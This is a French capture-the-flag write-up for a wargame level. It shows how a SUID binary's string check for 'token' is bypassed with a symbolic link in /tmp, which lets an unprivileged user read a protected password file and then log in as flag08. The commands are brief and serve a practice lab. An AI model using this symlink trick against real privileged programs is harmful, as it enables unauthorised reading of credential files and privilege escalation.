# Level08 — Bypass de filtre par lien symbolique

## Fichier fourni

```sh
ls -la ~
# -rwsr-s---  1 flag08 level08 ... level08
# -rw-------  1 flag08 flag08  ... token
```

Le fichier `token` est owned `flag08` et illisible pour `level08`. Le binaire SUID `flag08` sert à le lire — mais il filtre l'argument.

## Reconnaissance

```sh
ltrace ./level08 token
```

Sortie :

```
strstr("token", "token")  = "token"
printf("You may not access '%s'\n", "token")
exit(1)
```

Le binaire vérifie si l'argument contient la sous-chaîne `"token"` avec `strstr`. Si trouvé → refus immédiat. Sinon → ouvre et affiche le fichier.

## Vulnérabilité

Le filtre porte sur la **string passée en argument**, pas sur le fichier réellement ouvert. Un lien symbolique permet de faire pointer un nom arbitraire (sans "token") vers le fichier `token` — le check passe, le fichier est lu.

## Exploitation

Créer un symlink dans `/tmp` avec un nom ne contenant pas "token" :

```sh
ln -s /home/user/level08/token /tmp/yes
./level08 /tmp/yes
```

Le binaire reçoit `/tmp/yes` → `strstr("/tmp/yes", "token")` → `NULL` → check passé → ouvre et affiche le contenu de `token` → password de `flag08`.

Se connecter en `flag08` et récupérer le token :

```sh
su flag08   # password = contenu du fichier token
getflag
```

## Token

Voir `../flag`.
